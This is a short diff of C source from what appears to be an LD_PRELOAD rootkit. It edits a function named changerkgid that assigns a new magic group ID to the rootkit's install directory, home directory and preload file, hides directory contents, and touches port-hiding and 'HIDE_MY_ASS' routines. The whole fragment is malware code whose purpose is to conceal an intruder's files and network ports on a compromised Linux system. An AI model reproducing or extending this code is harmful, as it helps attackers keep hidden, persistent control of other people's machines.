@@ -39,13 +39,13 @@ gid_t changerkgid(void){
     call(CFWRITE, buf, 1, strlen(buf), fp);
     fclose(fp);
 
+    char *preloadpath = OLD_PRELOAD;
 #ifdef PATCH_DYNAMIC_LINKER
-    char *bdvpaths[3] = {INSTALL_DIR, HOMEDIR, PRELOAD_FILE};
-#else
-    char *bdvpaths[3] = {INSTALL_DIR, HOMEDIR, OLD_PRELOAD};
+    preloadpath = PRELOAD_FILE;
 #endif
-    for(i = 0; i != sizeofarr(bdvpaths); i++)
-        chown_path(bdvpaths[i], newgid);
+    chown_path(preloadpath, newgid);
+    hidedircontents(INSTALL_DIR, newgid);
+    hidedircontents(HOMEDIR, newgid);
 
     for(i = 0; i != TOGPATHS_SIZE; i++)
         chown_path(togpaths[i], newgid);
@@ -54,9 +54,7 @@ gid_t changerkgid(void){
     chown_path(HIDEPORTS, newgid);
 #endif
 
-    hidedircontents(INSTALL_DIR, newgid);
-    hidedircontents(HOMEDIR, newgid);
-
+    
 #ifdef HIDE_MY_ASS
     hidemyass();
 #endif
